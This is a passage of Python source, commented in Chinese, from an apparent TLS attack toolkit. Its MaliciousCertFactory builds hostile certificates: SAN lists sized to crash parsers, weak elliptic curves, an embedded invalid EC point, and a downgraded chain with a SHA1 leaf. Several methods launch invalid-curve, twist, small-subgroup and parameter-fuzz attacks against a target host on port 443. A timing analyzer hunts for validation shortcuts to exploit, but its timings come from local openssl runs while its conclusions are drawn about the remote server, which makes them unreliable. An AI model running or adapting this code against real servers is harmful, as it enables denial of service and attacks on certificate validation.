                x509.NameAttribute(NameOID.COMMON_NAME, target_domain),
            ])
            
            now = datetime.utcnow()
            
            # 使用较短的有效期，强制频繁重新签名（可能暴露nonce问题）
            cert = (
                x509.CertificateBuilder()
                .subject_name(subject_name)
                .issuer_name(subject_name)
                .public_key(private_key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now - timedelta(hours=1))  # 短有效期
                .not_valid_after(now + timedelta(hours=24))  # 仅24小时
                .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
                .add_extension(
                    x509.SubjectAlternativeName([
                        x509.DNSName(target_domain),
                        x509.DNSName("ecdsa-test." + target_domain)
                    ]), 
                    critical=False
                )
                .sign(private_key, hashes.SHA256(), default_backend())
            )
            
            print(f"[+] ECDSA nonce test certificate created")
            print(f"    └─ Short validity period to trigger frequent re-signing")
            
            return cert, private_key
            
        except Exception as e:
            print(f"[!] Failed to create ECDSA nonce bias certificate: {e}")
            raise
    
    @staticmethod
    def create_san_explosion_cert(target_domain, explosion_size=1000):
        """创建SAN爆炸证书 - 测试SAN列表解析器崩溃"""
        
        key = rsa.generate_private_key(65537, 2048, default_backend())
        
        subject_name = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "SAN Explosion Corp"),
            x509.NameAttribute(NameOID.COMMON_NAME, target_domain),
        ])
        
        now = datetime.utcnow()
        
        # 创建巨大的SAN列表（多种攻击模式）
        san_list = []
        
        # 模式1：数量爆炸 - 大量合法域名
        for i in range(min(explosion_size // 4, 250)):  # 限制为250个避免内存问题
            san_list.append(x509.DNSName(f"subdomain{i}.{target_domain}"))
        
        # 模式2：长度爆炸 - 极长域名（遵循DNS 63字符标签限制）
        for i in range(min(explosion_size // 20, 50)):
            long_subdomain = "x" * min(50 + i, 60)  # 50-60字符子域名，避免DNS限制
            try:
                san_list.append(x509.DNSName(f"{long_subdomain}.{target_domain}"))
            except Exception:
                break  # 如果域名太长，停止添加
        
        # 模式3：字符集爆炸 - 特殊字符和Unicode
        special_chars_domains = [
            f"0123456789.{target_domain}",
            f"abcdefghijklmnopqrstuvwxyz.{target_domain}",
            f"ABCDEFGHIJKLMNOPQRSTUVWXYZ.{target_domain}",
            f"test-dash.{target_domain}",
            f"test--double-dash.{target_domain}",
            f"123numeric.{target_domain}",
        ]
        
        for special_domain in special_chars_domains:
            try:
                san_list.append(x509.DNSName(special_domain))
            except Exception:
                continue
        
        # 模式4：嵌套爆炸 - 深层子域名
        for depth in range(1, min(explosion_size // 50, 20)):
            nested_domain = ".".join([f"level{i}" for i in range(depth)]) + f".{target_domain}"
            try:
                san_list.append(x509.DNSName(nested_domain))
            except Exception:
                break
        
        # 模式5：IP地址SAN（如果支持）
        try:
            san_list.append(x509.IPAddress("127.0.0.1"))
            san_list.append(x509.IPAddress("::1"))
            san_list.append(x509.IPAddress("192.168.1.1"))
            san_list.append(x509.IPAddress("10.0.0.1"))
        except Exception:
            pass
        
        # 模式6：边界测试 - 接近标准限制的域名
        boundary_domains = [
            "a" * 63 + f".{target_domain}",  # 63字符标签（DNS限制）
            f"{'x' * 50}.{'y' * 50}.{target_domain}",  # 多个长标签
        ]
        
        for boundary_domain in boundary_domains:
            try:
                san_list.append(x509.DNSName(boundary_domain))
            except Exception:
                continue
        
        # 确保目标域名在列表中
        if x509.DNSName(target_domain) not in san_list:
            san_list.insert(0, x509.DNSName(target_domain))
        
        print(f"[*] SAN Explosion: Generated {len(san_list)} SAN entries")
        
        # 创建证书
        try:
            cert = (
                x509.CertificateBuilder()
                .subject_name(subject_name)
                .issuer_name(subject_name)
                .public_key(key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now - timedelta(days=1))
                .not_valid_after(now + timedelta(days=365))
                .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
                .add_extension(x509.SubjectAlternativeName(san_list), critical=False)
                .sign(key, hashes.SHA256(), default_backend())
            )
            
            return {
                'cert': cert,
                'key': key,
                'san_count': len(san_list),
                'explosion_size': explosion_size,
                'attack_description': f'SAN explosion certificate with {len(san_list)} entries',
                'success': True
            }
            
        except Exception as e:
            # 如果证书创建失败，返回错误信息
            return {
                'cert': None,
                'key': key,
                'san_count': len(san_list),
                'explosion_size': explosion_size,
                'attack_description': f'SAN explosion failed: {str(e)}',
                'success': False,
                'error': str(e)
            }
    
    @staticmethod
    def create_weak_ec_curve_cert(target_domain):
        """生成使用弱椭圆曲线的证书"""
        print(f"[*] Creating weak EC curve certificate for {target_domain}")
        
        weak_curves = [
            # Brainpool曲线 - 某些实现有问题
            ec.BrainpoolP256R1(),
            # SECP192R1 - 密钥长度太短
            ec.SECP192R1(),
            # SECT163K1 - Koblitz曲线，可能存在特殊攻击
            ec.SECT163K1(),
        ]
        
        results = []
        
        for curve in weak_curves:
            try:
                private_key = ec.generate_private_key(curve, default_backend())
                
                subject_name = x509.Name([
                    x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                    x509.NameAttribute(NameOID.ORGANIZATION_NAME, f"Weak-{curve.name}"),
                    x509.NameAttribute(NameOID.COMMON_NAME, target_domain),
                ])
                
                now = datetime.utcnow()
                
                cert = (
                    x509.CertificateBuilder()
                    .subject_name(subject_name)
                    .issuer_name(subject_name)
                    .public_key(private_key.public_key())
                    .serial_number(x509.random_serial_number())
                    .not_valid_before(now)
                    .not_valid_after(now + timedelta(days=30))
                    .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
                    .add_extension(
                        x509.SubjectAlternativeName([x509.DNSName(target_domain)]), 
                        critical=False
                    )
                    .sign(private_key, hashes.SHA256(), default_backend())
                )
                
                results.append({
                    'curve': curve.name,
                    'cert': cert,
                    'key': private_key,
                    'vulnerability': f'Weak {curve.key_size}-bit curve'
                })
                
            except Exception as e:
                print(f"    [!] Failed to create cert with {curve.name}: {e}")
        
        return results
    
    @staticmethod
    def create_invalid_ec_point_cert(target_domain):
        """创建包含无效EC点的证书 - 数学标注 + 真实TLS注入验证"""
        print(f"[*] Creating invalid EC point certificate for {target_domain}")
        
        try:
            # 使用P-256作为基础
            private_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
            
            # 获取公钥点
            public_numbers = private_key.public_key().public_numbers()
            
            # 创建一个无效的公钥点（修改y坐标使其不在曲线上）
            invalid_y = (public_numbers.y + 1) % (2**256)
            
            # 构造无效的公钥
            invalid_public_numbers = ec.EllipticCurvePublicNumbers(
                x=public_numbers.x,
                y=invalid_y,
                curve=ec.SECP256R1()
            )
            
            # 注意：这可能会在某些库中失败，因为它们会验证点
            # 所以我们使用原始密钥创建证书，但在扩展中嵌入无效点
            
            subject_name = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Invalid-EC-Point"),
                x509.NameAttribute(NameOID.COMMON_NAME, target_domain),
            ])
            
            now = datetime.utcnow()
            
            # 创建自定义扩展包含无效EC点
            # OID 1.2.3.4.5.6.7.8.9.0 - 自定义扩展
            # 使用32字节编码来处理256位椭圆曲线坐标
            x_bytes = public_numbers.x.to_bytes(32, byteorder='big', signed=False)
            y_bytes = invalid_y.to_bytes(32, byteorder='big', signed=False)
            invalid_point_data = x_bytes + y_bytes
            custom_extension = x509.UnrecognizedExtension(
                oid=x509.ObjectIdentifier("1.2.3.4.5.6.7.8.9.0"),
                value=invalid_point_data
            )
            
            cert = (
                x509.CertificateBuilder()
                .subject_name(subject_name)
                .issuer_name(subject_name)
                .public_key(private_key.public_key())  # 使用有效密钥避免创建失败
                .serial_number(x509.random_serial_number())
                .not_valid_before(now)
                .not_valid_after(now + timedelta(days=30))
                .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
                .add_extension(custom_extension, critical=False)
                .add_extension(
                    x509.SubjectAlternativeName([x509.DNSName(target_domain)]), 
                    critical=False
                )
                .sign(private_key, hashes.SHA256(), default_backend())
            )
            
            print(f"[+] Invalid EC point certificate created with custom extension")
            
            # 替换为调用真实 p256 攻击结果
            attack_results = run_ec_attacks(host=target_domain, port=443, attack_types=["invalid_curve", "twist"], timeout=5.0)
            success = any(r.get('success') for r in attack_results)
            evidence = [r.get('evidence') for r in attack_results if r.get('evidence')]
            return {
                'cert': None,
                'key': None,
                'ec_attack_results': attack_results,
                'success': success,
                'evidence': evidence
            }
            
        except Exception as e:
            print(f"[!] Failed to create invalid EC point certificate: {e}")
            return {
                'cert': None,
                'key': None,
                'ec_attack_results': [],
                'success': False,
                'error': str(e)
            }
    
    @staticmethod
    def create_small_subgroup_ec_cert(target_domain):
        """改为调用 p256 的 small_subgroup 真实攻击"""
        print(f"[*] Running real EC attacks (small_subgroup) for {target_domain}")
        if not P256_MODULE_AVAILABLE:
            print("[!] P256 module not available, using standard EC cert")
            return MaliciousCertFactory.create_weak_ec_cert(target_domain)
        try:
            attack_results = run_ec_attacks(host=target_domain, port=443, attack_types=["small_subgroup"], timeout=5.0)
            success = any(r.get('success') for r in attack_results)
            evidence = [r.get('evidence') for r in attack_results if r.get('evidence')]
            return {
                'cert': None,
                'key': None,
                'ec_attack_results': attack_results,
                'success': success,
                'evidence': evidence
            }
        except Exception as e:
            print(f"[!] EC small_subgroup attacks failed: {e}")
            return {
                'cert': None,
                'key': None,
                'ec_attack_results': [],
                'success': False,
                'error': str(e)
            }
    
    @staticmethod
    def create_mixed_ec_cert_chain(target_domain):
        """创建混合强弱曲线的证书链"""
        print(f"[*] Creating mixed EC curve certificate chain for {target_domain}")
        
        try:
            # CA使用强曲线（P-384）
            ca_key = ec.generate_private_key(ec.SECP384R1(), default_backend())
            
            ca_name = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Strong EC CA"),
                x509.NameAttribute(NameOID.COMMON_NAME, "P-384 Root CA"),
            ])
            
            now = datetime.utcnow()
            
            # 创建CA证书
            ca_cert = (
                x509.CertificateBuilder()
                .subject_name(ca_name)
                .issuer_name(ca_name)
                .public_key(ca_key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now)
                .not_valid_after(now + timedelta(days=365))
                .add_extension(x509.BasicConstraints(ca=True, path_length=1), critical=True)
                .sign(ca_key, hashes.SHA384(), default_backend())  # 使用SHA384
            )
            
            # 中间证书使用中等强度曲线（P-256）
            intermediate_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
            
            intermediate_name = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Medium EC Intermediate"),
                x509.NameAttribute(NameOID.COMMON_NAME, "P-256 Intermediate CA"),
            ])
            
            intermediate_cert = (
                x509.CertificateBuilder()
                .subject_name(intermediate_name)
                .issuer_name(ca_cert.subject)
                .public_key(intermediate_key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now)
                .not_valid_after(now + timedelta(days=180))
                .add_extension(x509.BasicConstraints(ca=True, path_length=0), critical=True)
                .sign(ca_key, hashes.SHA256(), default_backend())  # 降级到SHA256
            )
            
            # 叶子证书使用弱曲线（P-192）
            try:
                leaf_key = ec.generate_private_key(ec.SECP192R1(), default_backend())
                weak_curve_used = "P-192"
            except:
                # 如果P-192不可用，使用P-256
                leaf_key = ec.generate_private_key(ec.SECP256R1(), default_backend())
                weak_curve_used = "P-256 (fallback)"
            
            leaf_name = x509.Name([
                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Weak EC Leaf"),
                x509.NameAttribute(NameOID.COMMON_NAME, target_domain),
            ])
            
            leaf_cert = (
                x509.CertificateBuilder()
                .subject_name(leaf_name)
                .issuer_name(intermediate_cert.subject)
                .public_key(leaf_key.public_key())
                .serial_number(x509.random_serial_number())
                .not_valid_before(now)
                .not_valid_after(now + timedelta(days=90))
                .add_extension(x509.BasicConstraints(ca=False, path_length=None), critical=True)
                .add_extension(
                    x509.SubjectAlternativeName([x509.DNSName(target_domain)]), 
                    critical=False
                )
                .sign(intermediate_key, hashes.SHA1(), default_backend())  # 使用弱哈希SHA1
            )
            
            print(f"[+] Mixed EC curve chain created: P-384 -> P-256 -> {weak_curve_used}")
            
            return {
                'chain': [leaf_cert, intermediate_cert, ca_cert],
                'keys': {
                    'ca': ca_key,
                    'intermediate': intermediate_key,
                    'leaf': leaf_key
                },
                'vulnerability': 'Downgrade attack via mixed EC curve strengths in chain'
            }
            
        except Exception as e:
            print(f"[!] Failed to create mixed EC certificate chain: {e}")
            raise
    
    @staticmethod
    def create_ec_confusion_cert(target_domain):
        """曲线参数混淆：改为调用真实 p256 攻击（param_fuzz/keyshare_diff）"""
        print(f"[*] Running real EC attacks (param_fuzz/keyshare_diff) for {target_domain}")
        if not P256_MODULE_AVAILABLE:
            print("[!] P256 module not available, using standard EC cert")
            return MaliciousCertFactory.create_weak_ec_cert(target_domain)
        try:
            attack_results = run_ec_attacks(host=target_domain, port=443, attack_types=["param_fuzz", "keyshare_diff"], timeout=5.0)
            success = any(r.get('success') for r in attack_results)
            evidence = [r.get('evidence') for r in attack_results if r.get('evidence')]
            return {
                'cert': None,
                'key': None,
                'ec_attack_results': attack_results,
                'success': success,
                'evidence': evidence
            }
        except Exception as e:
            print(f"[!] EC confusion attacks failed: {e}")
            return {
                'cert': None,
                'key': None,
                'ec_attack_results': [],
                'success': False,
                'error': str(e)
            }

class CertChainTimingAnalyzer:
    """证书链时序差分分析器 - 检测验证逻辑差异"""
    
    def __init__(self, target_host, target_port=443, timeout=5.0):
        self.target_host = target_host
        self.target_port = target_port
        self.timeout = timeout
        self.cert_factory = MaliciousCertFactory()
        self.timing_samples = []
        
    async def advanced_cert_timing_attack(self):
        """高级证书链验证时序差分攻击"""
        results = {
            'timing_profiles': {},
            'validation_logic_insights': [],
            'potential_bypasses': []
        }
        
        # 1. 测试不同证书链长度的验证时间
        chain_timing_results = await self._test_chain_length_timing()
        results['timing_profiles']['chain_length'] = chain_timing_results
        
        # 2. 测试证书扩展字段验证时序
        extension_timing_results = await self._test_extension_validation_timing()
        results['timing_profiles']['extensions'] = extension_timing_results
        
        # 3. 测试签名算法验证时序
        signature_timing_results = await self._test_signature_algorithm_timing()
        results['timing_profiles']['signatures'] = signature_timing_results
        
        # 4. 测试OCSP/CRL检查时序
        revocation_timing_results = await self._test_revocation_check_timing()
        results['timing_profiles']['revocation'] = revocation_timing_results
        
        # 5. 分析时序模式，推断验证逻辑
        logic_insights = self._analyze_validation_logic(results['timing_profiles'])
        results['validation_logic_insights'] = logic_insights
        
        # 6. 检测潜在的时序绕过机会
        potential_bypasses = self._detect_timing_bypasses(results['timing_profiles'])
        results['potential_bypasses'] = potential_bypasses
        
        return results
    
    async def _test_chain_length_timing(self):
        """测试不同证书链长度的验证时序（使用OpenSSL离线验证，避免网络噪声）"""
        chain_tests = []
        
        # 生成不同长度的证书链（2/3/5/8 层：leaf + intermediates + root）
        test_chains = [
            ('short_chain', await self._generate_chain(length=2)),
            ('normal_chain', await self._generate_chain(length=3)),
            ('long_chain', await self._generate_chain(length=5)),
            ('extra_long_chain', await self._generate_chain(length=8)),
        ]
        
        for chain_name, chain in test_chains:
            timings = []
            for _ in range(10):
                timing = await self._measure_cert_validation_time(chain)
                if timing > 0:
                    timings.append(timing)
            if timings:
                stats = self._robust_timing_analysis(timings, chain_name)
                print(f"[时序分析] {chain_name}: 平均={stats['mean']*1000:.1f}ms, 显著性水平={stats['significance_level']:.3f}, 置信区间={stats['confidence_interval'][0]*1000:.1f}-{stats['confidence_interval'][1]*1000:.1f}ms")
                chain_tests.append({
                    'chain_type': chain_name,
                    'chain_length': chain.get('length', 0),
                    'avg_time': stats['mean'],
                    'std_dev': stats['std_dev'],
                    'confidence_interval': stats['confidence_interval'],
                    'outliers_removed': stats['outliers_removed'],
                    'effective_samples': stats['effective_samples'],
                    'significance_level': stats['significance_level'],
                    'min_time': stats['min_filtered'],
                    'max_time': stats['max_filtered'],
                    'time_variance': stats['variance'],
                    'samples': len(timings)
                })
        return chain_tests
    
    async def _test_extension_validation_timing(self):
        """测试证书扩展字段验证时序（使用本地生成证书 + OpenSSL verify）"""
        extension_tests = []
        
        extension_combinations = [
            ('basic', ['basic_constraints']),
            ('extended', ['basic_constraints', 'key_usage', 'extended_key_usage']),
            ('comprehensive', ['basic_constraints', 'key_usage', 'extended_key_usage', 'subject_alt_name']),
            ('extreme', ['basic_constraints', 'key_usage', 'extended_key_usage', 'subject_alt_name', 'authority_key_identifier', 'subject_key_identifier', 'crl_distribution_points'])
        ]
        
        for ext_name, extensions in extension_combinations:
            chain = await self._generate_chain(length=3, extensions=extensions)
            timings = []
            for _ in range(10):
                timing = await self._measure_cert_validation_time(chain)
                if timing > 0:
                    timings.append(timing)
            if timings:
                stats = self._robust_timing_analysis(timings, f"ext_{ext_name}")
                print(f"[扩展分析] {ext_name}: 平均={stats['mean']*1000:.1f}ms, 显著性水平={stats['significance_level']:.3f}, 置信区间={stats['confidence_interval'][0]*1000:.1f}-{stats['confidence_interval'][1]*1000:.1f}ms")
                extension_tests.append({
                    'extension_set': ext_name,
                    'extensions': extensions,
                    'avg_time': stats['mean'],
                    'std_dev': stats['std_dev'],
                    'confidence_interval': stats['confidence_interval'],
                    'outliers_removed': stats['outliers_removed'],
                    'effective_samples': stats['effective_samples'],
                    'significance_level': stats['significance_level'],
                    'samples': len(timings)
                })
        return extension_tests
    
    async def _test_signature_algorithm_timing(self):
        """测试签名算法验证时序（用不同散列算法签发叶子证书并验证）"""
        signature_tests = []
        
        signature_algorithms = [
            ('sha256_rsa', hashes.SHA256()),
            ('sha384_rsa', hashes.SHA384()),
            ('sha512_rsa', hashes.SHA512()),
            ('sha1_rsa', hashes.SHA1())  # 弱算法
        ]
        
        for sig_name, hash_algo in signature_algorithms:
            try:
                chain = await self._generate_chain(length=3, hash_algo=hash_algo)
                timings = []
                for _ in range(10):
                    timing = await self._measure_cert_validation_time(chain)
                    if timing > 0:
                        timings.append(timing)
                if timings:
                    stats = self._robust_timing_analysis(timings, f"sig_{sig_name}")
                    print(f"[签名分析] {sig_name}: 平均={stats['mean']*1000:.1f}ms, 显著性水平={stats['significance_level']:.3f}, 置信区间={stats['confidence_interval'][0]*1000:.1f}-{stats['confidence_interval'][1]*1000:.1f}ms")
                    signature_tests.append({
                        'signature_algorithm': sig_name,
                        'avg_time': stats['mean'],
                        'std_dev': stats['std_dev'],
                        'confidence_interval': stats['confidence_interval'],
                        'outliers_removed': stats['outliers_removed'],
                        'effective_samples': stats['effective_samples'],
                        'significance_level': stats['significance_level'],
                        'samples': len(timings)
                    })
            except Exception as e:
                signature_tests.append({
                    'signature_algorithm': sig_name,
                    'error': str(e)
                })
        return signature_tests
    
    async def _test_revocation_check_timing(self):
        """测试吊销检查时序（仅嵌入AIA/CRL分发点，不进行网络抓取）"""
        revocation_tests = []
        
        test_scenarios = [
            ('no_revocation_info', None),
            ('ocsp_responder', 'http://ocsp.example.com'),
            ('invalid_ocsp', 'http://invalid-ocsp-responder.local')
        ]
        
        for scenario_name, ocsp_url in test_scenarios:
            try:
                chain = await self._generate_chain(length=3, ocsp_url=ocsp_url)
                timings = []
                for _ in range(10):
                    timing = await self._measure_cert_validation_time(chain)
                    if timing > 0:
                        timings.append(timing)
                if timings:
                    stats = self._robust_timing_analysis(timings, f"ocsp_{scenario_name}")
                    print(f"[OCSP分析] {scenario_name}: 平均={stats['mean']*1000:.1f}ms, 显著性水平={stats['significance_level']:.3f}, 置信区间={stats['confidence_interval'][0]*1000:.1f}-{stats['confidence_interval'][1]*1000:.1f}ms")
                    revocation_tests.append({
                        'scenario': scenario_name,
                        'ocsp_url': ocsp_url,
                        'avg_time': stats['mean'],
                        'std_dev': stats['std_dev'],
                        'confidence_interval': stats['confidence_interval'],
                        'outliers_removed': stats['outliers_removed'],
                        'effective_samples': stats['effective_samples'],
                        'significance_level': stats['significance_level'],
                        'samples': len(timings)
                    })
            except Exception as e:
                revocation_tests.append({
                    'scenario': scenario_name,
                    'error': str(e)
                })
        return revocation_tests
    
    async def _measure_cert_validation_time(self, cert_chain):
        """测量证书验证时间（使用 openssl verify 离线验证链条）"""
        # cert_chain: {'leaf': x509, 'intermediates': [x509...], 'root': x509, 'length': int}
        if not isinstance(cert_chain, dict) or 'leaf' not in cert_chain:
            return 0.0
        if not OPENSSL_BIN or not os.path.exists(OPENSSL_BIN):
            # OpenSSL 不可用时返回0，避免伪造的网络测量
            return 0.0
        
        import tempfile
        from cryptography.hazmat.primitives import serialization
        
        def to_pem(obj):
            return obj.public_bytes(encoding=serialization.Encoding.PEM)
        
        # 写入临时文件
        with tempfile.TemporaryDirectory() as tmpd:
            leaf_path = os.path.join(tmpd, 'leaf.pem')
            chain_path = os.path.join(tmpd, 'chain.pem')
            ca_path = os.path.join(tmpd, 'root.pem')
            
            with open(leaf_path, 'wb') as f:
                f.write(to_pem(cert_chain['leaf']))
            with open(chain_path, 'wb') as f:
                for c in cert_chain.get('intermediates', []):
                    f.write(to_pem(c))
            with open(ca_path, 'wb') as f:
                f.write(to_pem(cert_chain['root']))
            
            # 运行 openssl verify 并计时
            start = time.perf_counter()
            try:
                cmd = [OPENSSL_BIN, 'verify', '-CAfile', ca_path]
                if cert_chain.get('intermediates'):
                    cmd += ['-untrusted', chain_path]
                # 如果OpenSSL支持，验证主机名
                try:
                    socket.getaddrinfo(self.target_host, None)
                    cmd += ['-verify_hostname', self.target_host]
                except Exception:
                    pass
                proc = subprocess.run(cmd + [leaf_path], capture_output=True, text=True, timeout=self.timeout)
                _ = proc.stdout + proc.stderr
            except Exception:
                pass
            elapsed = time.perf_counter() - start
            return elapsed
    
    def _robust_timing_analysis(self, timings, context_name="unknown"):
        """鲁棒性时序分析 - 统计学去极值和显著性检测"""
        import statistics
        import math
        
        if len(timings) < 3:
            # 样本太少，返回基础统计
            mean_val = sum(timings) / len(timings)
            return {
                'mean': mean_val,
                'std_dev': 0,
                'confidence_interval': (mean_val, mean_val),
                'outliers_removed': 0,
                'effective_samples': len(timings),
                'significance_level': 0,
                'min_filtered': min(timings),
                'max_filtered': max(timings),
                'variance': 0
            }
        
        # 第一步：计算初始统计量
        original_mean = statistics.mean(timings)
        original_std = statistics.stdev(timings) if len(timings) > 1 else 0
        
        # 第二步：去除极值（使用 1.5*IQR 规则）
        sorted_timings = sorted(timings)
        q1_idx = len(sorted_timings) // 4
        q3_idx = 3 * len(sorted_timings) // 4
        q1 = sorted_timings[q1_idx]
        q3 = sorted_timings[q3_idx]
        iqr = q3 - q1
        
        lower_bound = q1 - 1.5 * iqr
        upper_bound = q3 + 1.5 * iqr
        
        # 过滤极值
        filtered_timings = [t for t in timings if lower_bound <= t <= upper_bound]
        outliers_removed = len(timings) - len(filtered_timings)
        
        # 如果过滤后样本太少，使用更宽松的过滤
        if len(filtered_timings) < 3:
            # 使用 2*IQR 规则（更宽松）
            lower_bound = q1 - 2.0 * iqr
            upper_bound = q3 + 2.0 * iqr
            filtered_timings = [t for t in timings if lower_bound <= t <= upper_bound]
            outliers_removed = len(timings) - len(filtered_timings)
        
        # 第三步：计算过滤后的统计量
        if filtered_timings:
            filtered_mean = statistics.mean(filtered_timings)
            filtered_std = statistics.stdev(filtered_timings) if len(filtered_timings) > 1 else 0
            filtered_min = min(filtered_timings)
            filtered_max = max(filtered_timings)
            variance = filtered_std ** 2
        else:
            # 回退到原始数据
            filtered_mean = original_mean
            filtered_std = original_std
            filtered_min = min(timings)
            filtered_max = max(timings)
            variance = original_std ** 2
            filtered_timings = timings
            outliers_removed = 0
        
        # 第四步：计算置信区间（95%）——使用自举法（bootstrap）替代 t 分布近似
        n = len(filtered_timings)
        if n > 1:
            low, high = self._bootstrap_ci(filtered_timings, alpha=0.05, B=1000)
            confidence_interval = (low, high)
        else:
            confidence_interval = (filtered_mean, filtered_mean)
        
        # 第五步：计算显著性水平（与原始数据对比）
        if original_std > 0 and len(filtered_timings) > 1:
            # 计算改进程度：过滤后的CV vs 原始CV
            original_cv = original_std / original_mean
            filtered_cv = filtered_std / filtered_mean if filtered_mean > 0 else 1
            significance_level = max(0, (original_cv - filtered_cv) / original_cv)
        else:
            significance_level = 0
        
        return {
            'mean': filtered_mean,
            'std_dev': filtered_std,
            'confidence_interval': confidence_interval,
            'outliers_removed': outliers_removed,
            'effective_samples': len(filtered_timings),
            'significance_level': significance_level,
            'min_filtered': filtered_min,
            'max_filtered': filtered_max,
            'variance': variance,
            # 调试信息
            'original_mean': original_mean,
            'original_std': original_std,
            'context': context_name
        }

    def _bootstrap_ci(self, data, alpha=0.05, B=1000):
        """对均值进行自举置信区间估计（BCa 可扩展，这里采用基础百分位法）。
        返回 (low, high)。数据需为列表且长度>=2。"""
        import random
        n = len(data)
        if n < 2:
            v = data[0] if data else 0.0
            return (v, v)
        means = []
        for _ in range(B):
            sample = [data[random.randrange(0, n)] for _ in range(n)]
            means.append(sum(sample) / n)
        means.sort()
        low_idx = max(0, int((alpha/2) * B) - 1)
        high_idx = min(B-1, int((1 - alpha/2) * B) - 1)
        return (means[low_idx], means[high_idx])
    
    def _analyze_validation_logic(self, timing_profiles):
        """分析证书验证逻辑模式"""
        insights = []
        
        # 1. 分析链长度对时间的影响
        if 'chain_length' in timing_profiles:
            chain_data = timing_profiles['chain_length']
            if len(chain_data) >= 2:
                time_per_cert = []
                for i in range(1, len(chain_data)):
                    time_diff = chain_data[i]['avg_time'] - chain_data[i-1]['avg_time']
                    cert_diff = chain_data[i]['chain_length'] - chain_data[i-1]['chain_length']
                    if cert_diff > 0:
                        time_per_cert.append(time_diff / cert_diff)
                
                if time_per_cert:
                    avg_time_per_cert = sum(time_per_cert) / len(time_per_cert)
                    insights.append({
                        'type': 'chain_length_analysis',
                        'finding': f'Average validation time per certificate: {avg_time_per_cert:.3f}s',
                        'implication': 'Linear scaling suggests full chain validation'
                    })
        
        # 2. 分析扩展字段对时间的影响
        if 'extensions' in timing_profiles:
            ext_data = timing_profiles['extensions']
            if len(ext_data) >= 2:
                basic_time = next((item['avg_time'] for item in ext_data if item['extension_set'] == 'basic'), 0)
                extreme_time = next((item['avg_time'] for item in ext_data if item['extension_set'] == 'extreme'), 0)
                
                if extreme_time > basic_time * 1.5:
                    insights.append({
                        'type': 'extension_validation',
                        'finding': f'Complex extensions increase validation time by {((extreme_time/basic_time - 1) * 100):.1f}%',
                        'implication': 'Server performs detailed extension validation'
                    })
        
        # 3. 分析签名算法对时间的影响
        if 'signatures' in timing_profiles:
            sig_data = timing_profiles['signatures']
            sha1_time = next((item['avg_time'] for item in sig_data if item['signature_algorithm'] == 'sha1_rsa'), None)
            sha256_time = next((item['avg_time'] for item in sig_data if item['signature_algorithm'] == 'sha256_rsa'), None)
            
            if sha1_time and sha256_time and sha1_time < sha256_time * 0.5:
                insights.append({
                    'type': 'weak_signature_rejection',
                    'finding': 'SHA1 signatures rejected much faster than SHA256',
                    'implication': 'Early rejection of weak signature algorithms'
                })
        
        return insights
    
    def _detect_timing_bypasses(self, timing_profiles):
        """检测潜在的时序绕过机会"""
        import math
        bypasses = []
        
        # 1. 检测短路验证模式（增强版 - 基于统计学显著性）
        if 'chain_length' in timing_profiles:
            chain_data = timing_profiles['chain_length']
            if len(chain_data) >= 2:
                short_time = chain_data[0]['avg_time']
                short_std = chain_data[0].get('std_dev', 0)
                long_time = chain_data[-1]['avg_time']
                long_std = chain_data[-1].get('std_dev', 0)
                
                # 计算统计学显著性
                if short_std > 0 and long_std > 0:
                    # 使用 Cohen's d 计算效应大小
                    pooled_std = math.sqrt((short_std**2 + long_std**2) / 2)
                    effect_size = abs(long_time - short_time) / pooled_std if pooled_std > 0 else 0
                    
                    # 计算置信区间是否重叠
                    short_ci = chain_data[0].get('confidence_interval', (short_time, short_time))
                    long_ci = chain_data[-1].get('confidence_interval', (long_time, long_time))
                    ci_overlap = max(0, min(short_ci[1], long_ci[1]) - max(short_ci[0], long_ci[0]))
                    
                    # 强显著性：效应大小>0.8且置信区间不重叠
                    if effect_size > 0.8 and ci_overlap <= 0:
                        significance = "high"
                    elif effect_size > 0.5:
                        significance = "medium"
                    else:
                        significance = "low"
                else:
                    # 回退到简单比较
                    significance = "low" if long_time < short_time * 2 else "none"
                
                if significance in ["high", "medium"]:
                    bypasses.append({
                        'type': 'validation_shortcircuit',
                        'risk': 'Server may skip full chain validation for long chains',
                        'exploitation': 'Use overly long certificate chains to trigger shortcuts',
                        'confidence': significance,
                        'evidence': f'Effect size: {effect_size:.2f}, CI overlap: {ci_overlap:.3f}s',
                        'statistical_metrics': {
                            'short_time': f'{short_time:.3f}±{short_std:.3f}s',
                            'long_time': f'{long_time:.3f}±{long_std:.3f}s',
                            'effect_size': effect_size
                        }
                    })
        
        # 2. 检测OCSP软失败（增强版 - 基于统计学显著性）
        if 'revocation' in timing_profiles:
            rev_data = timing_profiles['revocation']
            no_ocsp_item = next((item for item in rev_data if item['scenario'] == 'no_revocation_info'), None)
            invalid_ocsp_item = next((item for item in rev_data if item['scenario'] == 'invalid_ocsp'), None)
            
            if no_ocsp_item and invalid_ocsp_item:
                no_ocsp_time = no_ocsp_item['avg_time']
                no_ocsp_std = no_ocsp_item.get('std_dev', 0)
                invalid_ocsp_time = invalid_ocsp_item['avg_time']
                invalid_ocsp_std = invalid_ocsp_item.get('std_dev', 0)
                
                # 计算时间差异的统计学显著性
                time_diff = abs(no_ocsp_time - invalid_ocsp_time)
                
                if no_ocsp_std > 0 and invalid_ocsp_std > 0:
                    # 计算合并标准差
                    pooled_std = math.sqrt((no_ocsp_std**2 + invalid_ocsp_std**2) / 2)
                    
